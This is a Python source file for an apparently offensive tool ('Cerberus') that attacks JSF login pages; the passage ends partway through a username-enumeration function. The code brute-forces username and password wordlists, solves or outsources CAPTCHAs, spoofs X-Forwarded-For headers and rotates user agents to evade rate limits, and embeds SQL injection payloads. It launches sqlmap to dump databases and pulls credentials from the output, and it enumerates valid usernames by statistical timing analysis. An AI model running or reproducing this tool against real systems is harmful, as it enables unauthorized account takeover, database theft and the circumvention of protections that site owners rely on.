import asyncio
import aiohttp
import nest_asyncio
import requests
from bs4 import BeautifulSoup
import re
import sys
import time
import random
import argparse
import logging
import os
import json
from tqdm.asyncio import tqdm as async_tqdm
from concurrent.futures import ProcessPoolExecutor # For aiomultiprocess alternative (CPU-bound tasks)
from urllib.parse import urlparse, urljoin, quote
from urllib3.exceptions import InsecureRequestWarning
from fuzzywuzzy import fuzz
import numpy as np
from scipy import stats
import subprocess
import pickle
from cryptography.fernet import Fernet

# Initialize nest_asyncio
try:
    nest_asyncio.apply()
except RuntimeError:
    pass

# Performance optimization: Conditional imports
try:
    import Levenshtein
    FUZZ_FUNC = fuzz.ratio
    logger.info("Using C-optimized python-Levenshtein for fuzzy matching.")
except ImportError:
    FUZZ_FUNC = fuzz.ratio
    logger.warning("python-Levenshtein not found, falling back to pure Python fuzzywuzzy.")

# OCR/ML for image CAPTCHA
try:
    import pytesseract
    from PIL import Image
    HAS_OCR = True
    logger.info("pytesseract (OCR) enabled for image CAPTCHA.")
    # Placeholders for ML model integration
    # from tensorflow import keras # Example ML framework
    # CAPTCHA_ML_MODEL = keras.models.load_model('my_captcha_model.h5')
    # def predict_ml_captcha(image_data): return CAPTCHA_ML_MODEL.predict(image_data)
except ImportError:
    HAS_OCR = False
    logger.warning("pytesseract or PIL not found. Image CAPTCHA solving will be limited.")

# Selenium for headless browsing, screenshotting, and DOM parsing
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from webdriver_manager.chrome import DriverManager
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_ENABLED = True
except ImportError:
    SELENIUM_ENABLED = False
    logger.warning("Selenium not found. Headless browsing, DOM diffing & image CAPTCHA capture disabled.")

# CAPTCHA solving API integration
try:
    from twocaptcha import TwoCaptcha
    CAPTCHA_API_ENABLED = True
    CAPTCHA_API_KEY = os.environ.get('CAPTCHA_API_KEY') # Generalized API Key
    logger.info("Generic CAPTCHA API integration enabled.")
except ImportError:
    CAPTCHA_API_ENABLED = False
    logger.warning("CAPTCHA API client not found. CAPTCHA solving features limited.")

# Encryption Key for Checkpointing
ENCRYPTION_KEY_PATH = 'encryption_key.key'
if not os.path.exists(ENCRYPTION_KEY_PATH):
    key = Fernet.generate_key()
    with open(ENCRYPTION_KEY_PATH, 'wb') as key_file:
        key_file.write(key)
    logger.info(f"New encryption key generated at {ENCRYPTION_KEY_PATH}. Keep it secure!")

with open(ENCRYPTION_KEY_PATH, 'rb') as key_file:
    FERNET_KEY = key_file.read()
CIPHER_SUITE = Fernet(FERNET_KEY)


# Suppress InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# --- GLOBAL CONFIGURATION & PARAMETERS ---
LOGIN_URL = '' 
DEFAULT_USERNAME_WORDLIST = 'usernames.txt'
DEFAULT_PASSWORD_WORDLIST = 'passwords.txt'
CHECKPOINT_FILE = 'cerberus_checkpoint.secure'

SQLI_PAYLOADS = {
    'detection': {
        'general': ["' OR 1=1--", "'", "\"", ")", "'))", "]' ", "admin'", "'%20OR%201=1--",
                    '{"username": "admin\' OR 1=1--", "password": "pass"}', # JSON
                    'username=admin\' OR 1=1--&password=pass' # URL-encoded form
                    # Add more structured fuzzing points for XML, YAML, etc. if needed
                    ],
    },
    'time_based': {
        'mysql': "' AND SLEEP({delay})--", 'mssql': "' WAITFOR DELAY '0:0:{delay}'--",
        'postgresql': "' AND pg_sleep({delay})--", 'oracle': "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
    },
}

USER_AGENTS = [ # Expanded for better evasion
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36"
]
# Centralized, mutable global state for parameters and runtime data
JSF_PARAMS = {
    'username_field': None, 'password_field': None, 'form_id': None, 'submit_button_name': None,
    'viewstate_name': 'javax.faces.ViewState', 'success_indicators': [], 'failure_indicators': [],
    'user_unknown_indicator': None, 'enum_timing_delta_mean': 0, 'enum_timing_delta_std_valid': 0,
    'enum_timing_delta_std_invalid': 0, 'enum_len_delta': 0,
    'response_lengths': {'valid_user_fail': [], 'invalid_user_fail': []},
    'response_times': {'valid_user_fail': [], 'invalid_user_fail': []},
    'rate_limit_detected': False, 'needs_viewstate_per_request': False, 'fuzzy_threshold': 80,
    'captcha_present': False, 'db_type': 'unknown', 'captcha_sitekey': None, 'captcha_type': 'unknown',
    'sqli_detection_payload_type': None, 'sqli_injection_point': None, 'initial_recon_raw_html': None,
    'last_brute_force_attempt': None, 'crawled_forms': {},
    'dynamic_rate_limit_delay': 0.1,
    'sqli_detection_raw_request': None,
    'checkpoint_counter': 0, # Counter for batch checkpointing
    'checkpoint_frequency': 100, # Default checkpoint frequency
}

# Global flag to stop other tasks
found_credential_or_bypass = asyncio.Event() 
found_credential_or_bypass.clear()

# --- CHECKPOINTING ---
def save_checkpoint(data):
    JSF_PARAMS['checkpoint_counter'] += 1
    if JSF_PARAMS['checkpoint_counter'] % JSF_PARAMS['checkpoint_frequency'] == 0:
        try:
            serialized_data = pickle.dumps(data)
            encrypted_data = CIPHER_SUITE.encrypt(serialized_data)
            with open(CHECKPOINT_FILE, 'wb') as f:
                f.write(encrypted_data)
            logger.info(f"Checkpoint saved to {CHECKPOINT_FILE} (attempt {JSF_PARAMS['checkpoint_counter']}).")
        except Exception as e:
            logger.error(f"Failed to save encrypted checkpoint: {e}")

def load_checkpoint():
    try:
        if os.path.exists(CHECKPOINT_FILE):
            with open(CHECKPOINT_FILE, 'rb') as f:
                encrypted_data = f.read()
            decrypted_data = CIPHER_SUITE.decrypt(encrypted_data)
            data = pickle.loads(decrypted_data)
            logger.info(f"Checkpoint loaded from {CHECKPOINT_FILE}. Resuming attack.")
            return data
    except Exception as e:
        logger.error(f"Failed to load or decrypt checkpoint: {e}. Starting fresh. (Possibly wrong key or corrupted file)")
        if os.path.exists(CHECKPOINT_FILE): os.remove(CHECKPOINT_FILE)
    return None

# --- UTILITIES ---
def get_proxy_config(proxy_str):
    return {'http': proxy_str, 'https': proxy_str} if proxy_str else {'http': None, 'https': None}

def get_dynamic_headers_aiohttp():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': LOGIN_URL,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    headers['X-Forwarded-For'] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    return headers

def parse_html_with_bs4(html_content): return BeautifulSoup(html_content, 'html.parser')

async def solve_image_captcha(driver, captcha_element, api_key=None):
    """ Orchestrates image CAPTCHA solving: OCR (ML-enhanced), then API if configured. """
    if not HAS_OCR:
        logger.warning("OCR (pytesseract) not available. Cannot attempt automated image CAPTCHA solving.")
        return None

    # Save initial image for potential API or debugging
    image_path = 'captcha_image_temp.png'
    try:
        await asyncio.to_thread(captcha_element.screenshot, image_path) # Selenium screenshot on element
        
        img = Image.open(image_path)
        
        # --- Image Preprocessing for OCR ---
        img = img.convert('L') # Grayscale
        # Binarization (thresholding) - improves OCR dramatically
        img = img.point(lambda p: 255 if p > 150 else 0) # Adjust threshold as needed
        # Optional: Noise reduction, dilation/erosion for broken/thin characters
        # from PIL import ImageFilter
        # img = img.filter(ImageFilter.MedianFilter()) 
        
        # --- Attempt ML-based CAPTCHA solving (conceptual) ---
        # if 'CAPTCHA_ML_MODEL' in globals():
        #     try:
        #         # Preprocess img for ML model (resize, normalize, convert to numpy array)
        #         ml_input = np.array(img.resize((IMG_WIDTH, IMG_HEIGHT))) / 255.0
        #         ml_prediction = predict_ml_captcha(ml_input.reshape(1, IMG_WIDTH, IMG_HEIGHT, 1))
        #         ml_text = decode_ml_prediction(ml_prediction) # Custom function to convert prediction to text
        #         if len(ml_text) > 2 and len(ml_text) < 10:
        #             logger.info(f"ML CAPTCHA solver yielded: '{ml_text}'")
        #             return ml_text
        #     except Exception as ml_e:
        #         logger.warning(f"ML CAPTCHA solving failed: {ml_e}")

        # --- Fallback to Tesseract OCR ---
        ocr_text = await asyncio.to_thread(pytesseract.image_to_string, img, config='--psm 8 --oem 3')
        cleaned_text = re.sub(r'[^a-zA-Z0-9]', '', ocr_text).strip()
        logger.info(f"Tesseract OCR attempted on image CAPTCHA. Result: '{cleaned_text}'")
        if len(cleaned_text) > 2 and len(cleaned_text) < 10:
            return cleaned_text
        
        # --- Fallback to API if OCR is poor/fails ---
        if CAPTCHA_API_ENABLED and api_key:
            logger.info("OCR failed or result unreliable. Sending image CAPTCHA to API.")
            solver = TwoCaptcha(api_key) 
            result = await asyncio.to_thread(solver.normal, image_path)
            if result and 'code' in result and result['code']:
                logger.info("Image CAPTCHA solved via API.")
                return result['code']

    except Exception as e:
        logger.error(f"Error during image CAPTCHA solving: {e}")
    finally:
        if os.path.exists(image_path): os.remove(image_path)
    return None

async def provide_captcha_solution(login_page_html, captcha_api_key, human_in_loop_enabled, aiohttp_session):
    if not JSF_PARAMS['captcha_present']: return None

    logger.info(f"CAPTCHA detected ({JSF_PARAMS['captcha_type']}). Attempting to solve...")
    captcha_token = None

    if JSF_PARAMS['captcha_type'] in ['recaptcha', 'hcaptcha']:
        if CAPTCHA_API_ENABLED and captcha_api_key and JSF_PARAMS['captcha_sitekey']:
            try:
                solver = TwoCaptcha(captcha_api_key); params = {'sitekey': JSF_PARAMS['captcha_sitekey'], 'url': LOGIN_URL}
                result = None
                if JSF_PARAMS['captcha_type'] == 'recaptcha': result = await asyncio.to_thread(solver.recaptcha, **params)
                elif JSF_PARAMS['captcha_type'] == 'hcaptcha': result = await asyncio.to_thread(solver.hcaptcha, **params)
                if result and 'code' in result and result['code']:
                    captcha_token = result['code']; logger.info(f"{JSF_PARAMS['captcha_type']} CAPTCHA solved via API.")
            except Exception as e:
                logger.error(f"Error calling {JSF_PARAMS['captcha_type']} API: {e}")
    elif JSF_PARAMS['captcha_type'] == 'image_general' and SELENIUM_ENABLED:
        logger.info("Attempting automated image CAPTCHA capture and solve.")
        driver = None
        try:
            options = ChromeOptions(); options.add_argument("--headless"); options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(service=ChromeService(DriverManager().install()), options=options)
            await asyncio.to_thread(driver.get, LOGIN_URL)
            
            # Dynamically detect CAPTCHA image/input elements (more robust selectors)
            # Find image or input for CAPTCHA
            captcha_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//img[contains(@src, 'captcha') or contains(@src, 'code') or contains(@src, 'imagecode')] | //input[@type='text' and contains(@name, 'captcha')] | //div[contains(@class, 'captcha') and not(contains(@class, 'recaptcha'))]"))
            )
            # If it's an input field, it means the user types the CAPTCHA from an image nearby
            # This requires finding the image associated and then getting the input name
            if captcha_element.tag_name == 'input':
                captcha_input_name = captcha_element.get_attribute('name')
                # Try to find associated image
                img_element = driver.find_element(By.XPATH, f"//img[preceding-sibling::input[@name='{captcha_input_name}']] | //img[following-sibling::input[@name='{captcha_input_name}']]")
                if img_element:
                    captcha_token = await solve_image_captcha(driver, img_element, captcha_api_key)
                    if captcha_token:
                        JSF_PARAMS['captcha_input_field_name'] = captcha_input_name # Store discovered input name
            else: # It's likely the image element itself
                captcha_token = await solve_image_captcha(driver, captcha_element, captcha_api_key)
            
            driver.quit()
        except Exception as e:
            logger.error(f"Automated image CAPTCHA solving failed: {e}")
            if driver: driver.quit()

    if not captcha_token and human_in_loop_enabled:
        logger.warning(f"CAPTCHA API solving failed or not configured for {JSF_PARAMS['captcha_type']}. Falling back to human-in-the-loop.")
        captcha_token = await human_in_the_loop_captcha(JSF_PARAMS['initial_recon_raw_html'], aiohttp_session)

    return captcha_token

async def human_in_the_loop_captcha(html_content_for_view, aiohttp_session):
    logger.info("-------------------- HUMAN INTERVENTION REQUIRED for CAPTCHA --------------------")
    logger.info("A CAPTCHA needs to be solved. Opening the login page in a new browser window automatically.")
    
    html_file_path = "captcha_challenge.html"
    try:
        with open(html_file_path, "w", encoding="utf-8") as f: f.write(html_content_for_view)
        if SELENIUM_ENABLED:
            service = ChromeService(DriverManager().install()); driver = webdriver.Chrome(service=service)
            await asyncio.to_thread(driver.get, f"file://{os.path.abspath(html_file_path)}")
            logger.info("Browser opened. Solve the CAPTCHA and manually extract the token.")
            logger.info("Driver will quit after input. You can keep it open by commenting driver.quit().")
            # If the CAPTCHA involves interaction, instruct user
            if JSF_PARAMS['captcha_type'] == 'image_general' and JSF_PARAMS.get('captcha_input_field_name'):
                logger.info(f"CAPTCHA requires text input. Input field name: '{JSF_PARAMS['captcha_input_field_name']}'")
            
            response_token = input(f"Enter {JSF_PARAMS['captcha_type']}-response token (or hit Enter to skip, 'X' to abort): ").strip()
            driver.quit() # Automatically close browser after input
            return response_token if response_token and response_token.upper() != 'X' else None
        else:
            logger.warning("Selenium not enabled. Cannot open browser automatically. Please open 'captcha_challenge.html' manually.")
            response_token = input(f"Enter {JSF_PARAMS['captcha_type']}-response token (or hit Enter to skip, 'X' to abort): ").strip()
            return response_token if response_token and response_token.upper() != 'X' else None
    except Exception as e:
        logger.error(f"Error during human-in-the-loop CAPTCHA: {e}. Please ensure ChromeDriver is installed and selenium is working.")
        response_token = input(f"Enter {JSF_PARAMS['captcha_type']}-response token (or hit Enter to skip, 'X' to abort): ").strip()
        return response_token if response_token and response_token.upper() != 'X' else None


def call_sqlmap(target_url, request_file, proxy=None, level=3, risk=3, sqlmap_args=[]):
    logger.critical("SQLi detected! Spawning sqlmap for full exploitation. This may take time.")
    logger.critical(f"sqlmap will attempt to dump tables, users, and passwords. See sqlmap's output.")

    cmd_base = ['sqlmap', '-r', request_file, '--batch']
    if proxy and proxy.get('https'):
        cmd_base.extend(['--proxy', proxy.get('https')])
    
    cmd_base.extend([
        '--random-agent', '--threads', '10', # Use sqlmap's threading
        '--output-dir', f"sqlmap_output_{int(time.time())}"
    ])
    # Add customizable sqlmap arguments
    cmd_base.extend(sqlmap_args)

    logger.debug(f"Executing sqlmap command: {' '.join(cmd_base)}")
    try:
        process = subprocess.Popen(cmd_base, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Parse sqlmap's stdout in real-time
        full_sqlmap_output = []
        for line in process.stdout:
            sys.stdout.write(line)
            sys.stdout.flush()
            full_sqlmap_output.append(line)
            # Basic real-time parsing
            if "dumping" in line.lower() and "table" in line.lower():
                logger.info("sqlmap is now dumping table data.")
            if "password" in line.lower() and "hash" in line.lower():
                logger.critical("sqlmap detected password hashes!")

        sqlmap_stderr = process.stderr.read()
        process.wait()
        
        if process.returncode != 0:
            logger.error(f"sqlmap exited with error code {process.returncode}. Stderr: {sqlmap_stderr}")
            if "WAF" in sqlmap_stderr or "Web Application Firewall" in sqlmap_stderr:
                logger.error("sqlmap indicates Web Application Firewall interference.")

        if "dumped" in "".join(full_sqlmap_output) or "retrieved" in "".join(full_sqlmap_output) or "pwned" in "".join(full_sqlmap_output):
            logger.critical("sqlmap successfully retrieved data! Check the output directory for full details.")
            # Programmatic parsing for key findings from sqlmap's files
            output_dir = cmd_base[-1]
            if os.path.exists(output_dir) and os.path.isdir(output_dir):
                for root, dirs, files in os.walk(output_dir):
                    for file in files:
                        if file.endswith(('.csv', '.txt', '.json')):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    creds_pattern = re.compile(r'\b(?:username|user|email|login|account)\b[^:\n\r]*:\s*([^\s,]+)(?:\s*,|\s*\|+\s*|\s*\n)[^:\n\r]*\b(?:password|pass|passwd|pwd)\b[^:\n\r]*:\s*([^\s,]+)', re.IGNORECASE)
                                    found_creds = creds_pattern.findall(content)
                                    if found_creds:
                                        logger.critical(f"Found potential credentials in {file_path}:")
                                        for u, p in found_creds:
                                            logger.critical(f"  - Username: {u}, Password: {p}")
                                        return 
                            except Exception as parse_e:
                                logger.warning(f"Could not parse sqlmap output file {file}: {parse_e}")
        
    except FileNotFoundError:
        logger.fatal("sqlmap not found. Please ensure sqlmap is installed and in your system's PATH.")
    except Exception as e:
        logger.fatal(f"Error calling sqlmap: {e}")

# --- RECONNAISSANCE ---
async def fetch_login_page_details(aiohttp_session, proxy_config, use_headless=False, no_ssl_verify=False):
    logger.debug("Fetch login page details started.")
    if found_credential_or_bypass.is_set(): return None # Don't fetch if already found

    try:
        html_content = ""
        fetch_method = "aiohttp"
        if use_headless and SELENIUM_ENABLED:
            fetch_method = "headless browser"
            driver = None
            try:
                options = ChromeOptions(); options.add_argument("--headless"); options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                driver = webdriver.Chrome(service=ChromeService(DriverManager().install()), options=options)
                await asyncio.to_thread(driver.get, LOGIN_URL)
                await asyncio.to_thread(WebDriverWait(driver, 10).until, EC.presence_of_element_located((By.TAG_NAME, "form")))
                html_content = await asyncio.to_thread(lambda: driver.page_source)()
            finally:
                if driver: await asyncio.to_thread(driver.quit)()
        else:
            headers = get_dynamic_headers_aiohttp()
            async with aiohttp_session.get(LOGIN_URL, headers=headers, ssl=(not no_ssl_verify), proxy=proxy_config['https']) as response:
                response.raise_for_status()
                html_content = await response.text()

        JSF_PARAMS['initial_recon_raw_html'] = html_content

        soup = parse_html_with_bs4(html_content)
        
        viewstate_tag = soup.find('input', {'name': 'javax.faces.ViewState'})
        if viewstate_tag:
            JSF_PARAMS['viewstate_name'] = viewstate_tag.get('name') or 'javax.faces.ViewState'
            current_viewstate = viewstate_tag.get('value')
        else: current_viewstate = None

        form = soup.find('form')
        if form:
            JSF_PARAMS['form_id'] = form.get('id')
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                input_type = input_tag.get('type')
                if input_type == 'text' and not JSF_PARAMS['username_field']: JSF_PARAMS['username_field'] = name
                elif input_type == 'password' and not JSF_PARAMS['password_field']: JSF_PARAMS['password_field'] = name
                elif input_type in ['submit', 'button'] and 'login' in (name or '').lower(): JSF_PARAMS['submit_button_name'] = name
            
            if not JSF_PARAMS['username_field'] or not JSF_PARAMS['password_field']:
                logger.warning("Auto identification failed for login fields, falling back to common JSF names.")
                JSF_PARAMS['username_field'] = 'j_username'; JSF_PARAMS['password_field'] = 'j_password'
        else: logger.error("Could not find a <form> tag on the login page."); sys.exit(1)

        # CAPTCHA detection and type inference
        if soup.find(class_=re.compile(r'g-recaptcha-response|recaptcha-checkbox|g-recaptcha')):
            JSF_PARAMS['captcha_present'] = True; JSF_PARAMS['captcha_type'] = 'recaptcha'
            g_rec_div = soup.find(class_='g-recaptcha')
            if g_rec_div: JSF_PARAMS['captcha_sitekey'] = g_rec_div.get('data-sitekey')
        elif soup.find(class_=re.compile(r'h-captcha|btn-hcaptcha')):
            JSF_PARAMS['captcha_present'] = True; JSF_PARAMS['captcha_type'] = 'hcaptcha'
            h_cap_div = soup.find(class_='h-captcha')
            if h_cap_div: JSF_PARAMS['captcha_sitekey'] = h_cap_div.get('data-sitekey')
        elif soup.find('img', {'src': re.compile(r'captcha|code\.png|imagecode')}) or soup.find('div', class_=re.compile(r'captcha|challenge')):
            JSF_PARAMS['captcha_present'] = True; JSF_PARAMS['captcha_type'] = 'image_general'

        # Success/Failure Indicator Discovery & ViewState invalidation check
        invalid_user = "nonexistentuser" + str(random.randint(1000, 9999))
        invalid_pass = "wrongpass" + str(random.randint(1000, 9999))
        
        _, _, _, failed_response_obj, _ = await attempt_login_single(aiohttp_session, invalid_user, invalid_pass, current_viewstate, proxy_config, dry_run=True, no_ssl_verify=no_ssl_verify)
        
        if failed_response_obj:
            soup_fail = parse_html_with_bs4(await failed_response_obj.text())
            common_failure_phrases = ["invalid", "incorrect", "failed", "error", "login", "authentication failed", "credentials", "password"]
            potential_failure_texts = []
            for phrase in common_failure_phrases:
                found_elements = soup_fail.find_all(string=re.compile(f'(?i){phrase}'))
                text_snippets = [str(s).strip() for s in found_elements if len(str(s).strip()) > 5]
                for snippet in text_snippets:
                    if soup_fail.find(string=snippet) and soup_fail.find(string=snippet).find_parent(class_=re.compile(r'message|error|alert|notification', re.IGNORECASE)):
                        potential_failure_texts.append(snippet)
            if potential_failure_texts:
                JSF_PARAMS['failure_indicators'] = sorted(list(set([t for t in potential_failure_texts if len(t.split()) > 1])), key=len, reverse=True)
            
            new_viewstate_tag = parse_html_with_bs4(await failed_response_obj.text()).find('input', {'name': JSF_PARAMS['viewstate_name']})
            JSF_PARAMS['needs_viewstate_per_request'] = bool(new_viewstate_tag and new_viewstate_tag.get('value') != current_viewstate)
        return current_viewstate
    
    except aiohttp.ClientConnectorError as e: logger.fatal(f"Error during recon (aiohttp): {e}"); sys.exit(1)
    except Exception as e: logger.fatal(f"Error during recon (headless/other): {e}. Check ChromeDriver."); sys.exit(1)

# --- CORE LOGIC (attempt_login_single, build_jsf_post_data, check_response_for_success_intelligent) ---
async def build_jsf_post_data(username, password, current_viewstate, captcha_token=None):
    post_data = {
        JSF_PARAMS['form_id']: JSF_PARAMS['form_id'], JSF_PARAMS['username_field']: username,
        JSF_PARAMS['password_field']: password, JSF_PARAMS['viewstate_name']: current_viewstate,
        'javax.faces.partial.ajax': 'true', 'javax.faces.partial.execute': '@all',
        'javax.faces.partial.render': '@all',
        '_random_pad_': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 15)))
    }
    if JSF_PARAMS['submit_button_name']: post_data[JSF_PARAMS['submit_button_name']] = JSF_PARAMS['submit_button_name']
    if captcha_token and JSF_PARAMS['captcha_present']:
        if JSF_PARAMS['captcha_type'] == 'recaptcha': post_data['g-recaptcha-response'] = captcha_token
        elif JSF_PARAMS['captcha_type'] == 'hcaptcha': post_data['h-captcha-response'] = captcha_token
        elif JSF_PARAMS['captcha_type'] == 'image_general': 
            # If CAPTCHA input field name was dynamically discovered
            if JSF_PARAMS.get('captcha_input_field_name'): post_data[JSF_PARAMS['captcha_input_field_name']] = captcha_token 
            else: post_data['captcha_response'] = captcha_token # Fallback if not found
        else: logger.warning(f"CAPTCHA token for unrecognized type {JSF_PARAMS['captcha_type']}. Defaulting to g-recaptcha-response."); post_data['g-recaptcha-response'] = captcha_token
    return post_data

async def check_response_for_success_intelligent(response_text, response_obj):
    if response_obj.status == 302:
        location = response_obj.headers.get('Location')
        if location and (LOGIN_URL not in location and urlparse(location).path != urlparse(LOGIN_URL).path):
            if any(FUZZ_FUNC(str(indicator).lower(), location.lower()) >= JSF_PARAMS['fuzzy_threshold'] for indicator in JSF_PARAMS['success_indicators']): return True, f"High confidence redirect to {location} (matched success indicator)"
            if not any(FUZZ_FUNC(str(indicator).lower(), location.lower()) >= JSF_PARAMS['fuzzy_threshold'] for indicator in JSF_PARAMS['failure_indicators']): return True, f"Redirect to {location} (away from login, no failure match)"
    
    for indicator in JSF_PARAMS['success_indicators']:
        if FUZZ_FUNC(indicator.lower(), response_text.lower()) >= JSF_PARAMS['fuzzy_threshold']: return True, f"Success indicator found (fuzzy match): '{indicator}'"

    is_failure = False
    for indicator in JSF_PARAMS['failure_indicators']:
        if FUZZ_FUNC(indicator.lower(), response_text.lower()) >= JSF_PARAMS['fuzzy_threshold']: is_failure = True; break
            
    if not is_failure and response_obj.status != 302:
        soup = parse_html_with_bs4(response_text)
        if soup.find('form', id=JSF_PARAMS['form_id'] or True) or soup.find('input', {'name': JSF_PARAMS['password_field']}): is_failure = True
            
    return not is_failure, "Failure indicators present or login form remains on page"

async def attempt_login_single(aiohttp_session, user, pwd, viewstate_hint, proxy_config, retry_count=0, dry_run=False, captcha_token=None, no_ssl_verify=False):
    if found_credential_or_bypass.is_set() and not dry_run: return user, pwd, False, None, 0

    current_viewstate = viewstate_hint
    
    if JSF_PARAMS['needs_viewstate_per_request'] and not dry_run: # Only fetch if not dry run
        current_viewstate = await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify) 
        if not current_viewstate:
            if retry_count < 3: await asyncio.sleep(JSF_PARAMS['dynamic_rate_limit_delay'] * (2 ** retry_count)); return await attempt_login_single(aiohttp_session, user, pwd, viewstate_hint, proxy_config, retry_count + 1, no_ssl_verify=no_ssl_verify)
            return user, pwd, False, None, 0

    post_data = await build_jsf_post_data(user, pwd, current_viewstate, captcha_token)
    headers = get_dynamic_headers_aiohttp()

    try:
        start_time = time.time()
        async with aiohttp_session.post(
            LOGIN_URL, data=post_data, headers=headers, ssl=(not no_ssl_verify), proxy=proxy_config['https'], allow_redirects=False
        ) as response:
            response_text = await response.text()
            duration = time.time() - start_time
            
            is_success, reason = await check_response_for_success_intelligent(response_text, response)
            
            if is_success:
                if not dry_run: found_credential_or_bypass.set()
                return user, pwd, True, response, duration
            else:
                rate_limit_keywords = ["too many requests", "rate limit exceeded", "429 Too Many Requests", "try again later", "blocked by", "waf"]
                if response.status == 429 or any(FUZZ_FUNC(keyword.lower(), response_text.lower()) >= 80 for keyword in rate_limit_keywords):
                    JSF_PARAMS['rate_limit_detected'] = True
                    logger.warning(f"Rate limit hit for {user}:{pwd}. Status: {response.status}. Next delay: {JSF_PARAMS['dynamic_rate_limit_delay'] * 1.2:.2f}s")
                    JSF_PARAMS['dynamic_rate_limit_delay'] *= 1.2 # Adaptive increase
                    JSF_PARAMS['dynamic_rate_limit_delay'] = min(JSF_PARAMS['dynamic_rate_limit_delay'], 10.0) # Cap delay at 10s
                return user, pwd, False, response, duration

    except aiohttp.ClientConnectorError as e:
        logger.error(f"Connection Error for {user}:{pwd}: {e}. Retrying {retry_count+1}/3...")
        if retry_count < 3: await asyncio.sleep(JSF_PARAMS['dynamic_rate_limit_delay'] * (2 ** retry_count)); return await attempt_login_single(aiohttp_session, user, pwd, viewstate_hint, proxy_config, retry_count + 1, no_ssl_verify=no_ssl_verify)
        return user, pwd, False, None, 0
    except aiohttp.ClientError as e: logger.error(f"General Aiohttp client error for {user}:{pwd}: {e}"); return user, pwd, False, None, 0

# --- ADVANCED ENUMERATION ---
async def conduct_username_enumeration(aiohttp_session, proxy_config, threads, no_ssl_verify=False):
    logger.info("Conducting intelligent username enumeration...")
    
    test_user_valid_candidate = "admin" 
    test_user_invalid_candidate = "nonexistentuser" + str(random.randint(10000, 99999))
    test_pass = "somebadpassword123" 
    
    sample_size = 50 # Start with good sample size, it can dynamically adjust

    sample_tasks = []
    # Using a queue to limit concurrent samples to `threads`
    semaphore = asyncio.Semaphore(threads) # Limit concurrent external requests during sampling
    
    async def run_sample_task(user_candidate):
        async with semaphore:
            return await attempt_login_single(aiohttp_session, user_candidate, test_pass, await fetch_login_page_details(aiohttp_session, proxy_config, no_ssl_verify=no_ssl_verify), proxy_config, no_ssl_verify=no_ssl_verify)

    for _ in range(sample_size):
        sample_tasks.append(run_sample_task(test_user_valid_candidate))
        sample_tasks.append(run_sample_task(test_user_invalid_candidate))
    
    for task_future in async_tqdm(asyncio.as_completed(sample_tasks), total=len(sample_tasks), desc="Collecting Enum Samples"):
        user, _, _, resp_obj, duration = await task_future
        if resp_obj:
            if user == test_user_valid_candidate:
                 JSF_PARAMS['response_times']['valid_user_fail'].append(duration)
                 JSF_PARAMS['response_lengths']['valid_user_fail'].append(len(await resp_obj.text()))
            else:
                JSF_PARAMS['response_times']['invalid_user_fail'].append(duration)
                JSF_PARAMS['response_lengths']['invalid_user_fail'].append(len(await resp_obj.text()))

    if not JSF_PARAMS['response_times']['valid_user_fail'] or not JSF_PARAMS['response_times']['invalid_user_fail']:
        logger.warning("Insufficient samples for robust enumeration analysis."); return

    mean_time_valid, std_time_valid = np.mean(JSF_PARAMS['response_times']['valid_user_fail']), np.std(JSF_PARAMS['response_times']['valid_user_fail'])
    mean_time_invalid, std_time_invalid = np.mean(JSF_PARAMS['response_times']['invalid_user_fail']), np.std(JSF_PARAMS['response_times']['invalid_user_fail'])
    
    logger.info(f"Enum Time Avg: Valid={mean_time_valid:.4f}s (StdDev={std_time_valid:.4f}), Invalid={mean_time_invalid:.4f}s (StdDev={std_time_invalid:.4f})")

    t_stat, p_value = stats.ttest_ind(JSF_PARAMS['response_times']['valid_user_fail'], JSF_PARAMS['response_times']['invalid_user_fail'], equal_var=False)

    logger.info(f"Timing t-test: t={t_stat:.2f}, p={p_value:.4f}")

    avg_len_valid, avg_len_invalid = np.mean(JSF_PARAMS['response_lengths']['valid_user_fail']), np.mean(JSF_PARAMS['response_lengths']['invalid_user_fail'])
